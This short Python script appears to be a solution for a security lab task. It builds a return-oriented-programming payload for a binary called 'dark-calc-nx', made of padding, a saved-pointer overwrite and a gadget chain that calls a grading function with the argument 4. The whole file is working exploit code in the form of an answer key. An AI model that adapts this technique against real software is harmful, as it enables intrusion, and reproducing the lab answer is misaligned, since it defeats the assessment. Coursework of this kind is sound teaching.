#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

p64 = lambda x: x.to_bytes(8, "little")

POP_RDI    = 0x401A33
RET        = 0x401A34
GRADE_EVAL = 0x401978
EXIT_ZERO  = 0x4018AA

payload  = b"A" * 16
payload += b"B" * 8
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(4)
payload += p64(GRADE_EVAL)
payload += p64(EXIT_ZERO)

sys.stdout.buffer.write(payload)
